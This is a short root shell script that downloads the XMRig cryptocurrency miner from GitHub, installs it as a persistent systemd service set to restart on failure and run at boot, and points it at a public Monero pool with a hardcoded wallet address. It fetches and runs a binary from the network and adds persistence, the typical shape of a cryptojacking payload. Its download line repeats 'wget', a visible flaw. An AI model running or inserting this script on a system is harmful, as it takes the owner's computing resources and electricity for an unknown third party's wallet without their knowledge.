cd /usr/local/bin
sudo wget wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
sudo tar xvzf xmrig-6.17.0-linux-static-x64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.17.0/xmrig -o pool.supportxmr.com:443 -u 8Bp3awKtD9ZLXET3FDzFNCaMjGY9Si49sYQcRvQVQ6qDSFTuStHwpgb8Drmx6UyNh4431JYw6JBUe5RFAjun9PniUn8zW1U -k --tls -p TUYULxmr -p x --randomx-no-rdmsr\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
sudo systemctl start xmrig.service
echo "Setup completed!"
